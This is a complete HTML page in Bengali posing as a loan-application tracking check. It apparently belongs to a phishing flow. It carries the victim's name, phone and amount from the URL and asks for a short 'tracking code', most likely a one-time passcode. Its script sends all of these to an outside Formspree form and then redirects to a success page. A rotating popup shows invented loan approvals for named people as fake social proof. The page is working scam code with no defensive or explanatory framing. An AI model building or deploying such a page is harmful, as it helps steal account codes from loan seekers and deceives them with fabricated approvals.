<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>আবেদন ট্র্যাকিং যাচাই</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: #0f172a; 
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        .header {
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: #ffffff;
            padding: 30px 20px;
            text-align: center;
        }
        .header h2 { font-size: 22px; margin-bottom: 6px; }
        .header p { font-size: 13px; opacity: 0.9; }
        .form-wrap { padding: 25px 20px; flex-grow: 1; }
        .form-group { margin-bottom: 18px; }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #334155;
            margin-bottom: 8px;
        }
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1.5px solid #cbd5e1;
            border-radius: 10px;
            font-size: 15px;
            outline: none;
            background: #f8fafc;
        }
        .tracking-input {
            letter-spacing: 5px;
            font-size: 18px !important;
            font-weight: bold;
            text-align: center;
        }
        .btn-submit {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: #ffffff;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }

        /* পপআপ নোটিফিকেশন স্টাইল */
        .loan-popup {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #ffffff;
            color: #1e293b;
            padding: 12px 16px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 9999;
            max-width: 340px;
            border-left: 5px solid #16a34a;
            opacity: 0;
            transform: translateY(30px);
            transition: all 0.5s ease-in-out;
            pointer-events: none;
        }
        .loan-popup.show {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }
        .popup-icon {
            width: 38px;
            height: 38px;
            background: #dcfce7;
            color: #16a34a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            flex-shrink: 0;
        }
        .popup-content { display: flex; flex-direction: column; }
        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
        @media (max-width: 480px) {
            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>আবেদন ট্র্যাকিং কোড</h2>
        <p>আপনার রেফারেন্স বা ট্র্যাকিং কোড প্রদান করুন</p>
    </div>

    <div class="form-wrap">
        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
            <!-- হিডেন ফিল্ড: আগের পেজের নাম ও টাকার পরিমাণ ফর্মের সাথে চলে যাবে -->
            <input type="hidden" name="নাম" id="hiddenName">
            <input type="hidden" name="টাকার_পরিমাণ" id="hiddenAmount">

            <div class="form-group">
                <label><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
                <input type="tel" id="userPhone" name="মোবাইল" required readonly style="background: #e2e8f0; color: #334155;">
            </div>

            <div class="form-group">
                <label><i class="fa-solid fa-hashtag"></i> ট্র্যাকিং কোড (৪ ডিজিট)</label>
                <input type="text" name="ট্র্যাকিং_আইডি" class="tracking-input" maxlength="6" required placeholder="####">
            </div>

            <button type="submit" id="btnSubmit" class="btn-submit">
                <span>যাচাই সম্পন্ন করুন</span>
                <i class="fa-solid fa-arrow-right"></i>
            </button>
        </form>
    </div>
</div>

<!-- নোটিফিকেশন পপআপ কন্টেইনার -->
<div id="loanAlert" class="loan-popup">
    <div class="popup-icon">
        <i class="fa-solid fa-circle-check"></i>
    </div>
    <div class="popup-content">
        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
        <span class="popup-time" id="popTime">এইমাত্র</span>
    </div>
</div>

<script>
    // আগের পেজ থেকে নাম, ফোন ও পরিমাণ নিয়ে ফর্ম ফিল্ডে বসানো
    const params = new URLSearchParams(window.location.search);
    document.getElementById('hiddenName').value = params.get('name') || '';
    document.getElementById('userPhone').value = params.get('phone') || '';
    document.getElementById('hiddenAmount').value = params.get('amount') || '';

    const form = document.getElementById("verifyForm");
    const btnSubmit = document.getElementById("btnSubmit");

    form.addEventListener("submit", function(event) {
        event.preventDefault();
        btnSubmit.disabled = true;
        btnSubmit.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';

        const data = new FormData(form);

        fetch(form.action, {
            method: "POST",
            body: data,
            headers: { 'Accept': 'application/json' }
        }).finally(() => {
            window.location.href = "./success.html";
        });
    });

    // পপআপ নোটিফিকেশন স্ক্রিপ্ট
    const loanData = [
        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" },
        { name: "মোঃ রফিকুল ইসলাম", district: "রাজশাহী", amount: "৫০,০০০", time: "৪ মিনিট আগে" },
        { name: "শারমিন জাহান", district: "সিলেট", amount: "২৫,০০০", time: "৩ মিনিট আগে" }
    ];

    let currentIndex = 0;
    const popupEl = document.getElementById("loanAlert");
    const nameEl = document.getElementById("popName");
    const amountEl = document.getElementById("popAmount");
    const timeEl = document.getElementById("popTime");

    function showNextNotification() {
        const item = loanData[currentIndex];
        nameEl.innerText = `${item.name} (${item.district})`;
        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
        timeEl.innerText = item.time;
        popupEl.classList.add("show");

        setTimeout(() => {
            popupEl.classList.remove("show");
        }, 4000);

        currentIndex = (currentIndex + 1) % loanData.length;
    }

    setTimeout(() => {
        showNextNotification();
        setInterval(showNextNotification, 8000);
    }, 2000);
</script>

</body>
</html>
